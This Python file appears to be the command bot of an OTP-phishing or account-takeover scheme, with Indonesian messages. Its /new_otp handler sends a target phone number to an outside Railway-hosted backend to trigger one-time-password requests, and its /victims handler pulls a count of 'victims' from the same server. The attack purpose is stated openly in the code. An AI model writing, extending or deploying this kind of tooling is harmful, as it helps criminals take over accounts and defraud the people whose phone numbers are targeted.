import os
import requests
from telegram import Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters

# Config
BOT_TOKEN = os.environ.get('BOT_TOKEN')
RAILWAY_URL = 'https://siluman-cancut-production.up.railway.app'

# Buat bot instance
bot = Bot(token=BOT_TOKEN)

async def start_command(update, context):
    print("🎯 /start received")
    await update.message.reply_text('🤖 SUPER SIMPLE BOT WORKING! 😈')

async def new_otp_command(update, context):
    print("🎯 /new_otp received")
    try:
        if context.args:
            phone = context.args[0]
            print(f"📱 Requesting OTP for: {phone}")
            
            response = requests.get(f'{RAILWAY_URL}/get_new_otp?phone={phone}')
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    await update.message.reply_text(f'✅ OTP DIMINTA! 😈\n📱 {phone}')
                else:
                    await update.message.reply_text(f'❌ Gagal: {data.get("error")}')
            else:
                await update.message.reply_text('❌ API Error')
        else:
            await update.message.reply_text('❌ Format: /new_otp +62xxx')
    except Exception as e:
        await update.message.reply_text(f'💀 Error: {str(e)}')

async def victims_command(update, context):
    print("🎯 /victims received")
    try:
        response = requests.get(f'{RAILWAY_URL}/victims')
        if response.status_code == 200:
            victims = response.json().get('victims', [])
            await update.message.reply_text(f'🎯 VICTIMS: {len(victims)} korban')
        else:
            await update.message.reply_text('❌ Gagal ambil victims')
    except Exception as e:
        await update.message.reply_text(f'💀 Error: {str(e)}')

def main():
    print("🚀 Starting SUPER SIMPLE BOT...")
    
    # Buat application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("new_otp", new_otp_command))
    application.add_handler(CommandHandler("victims", victims_command))
    
    # Start bot
    application.run_polling()
    print("🤖 SUPER SIMPLE BOT RUNNING!")

if __name__ == "__main__":
    main()
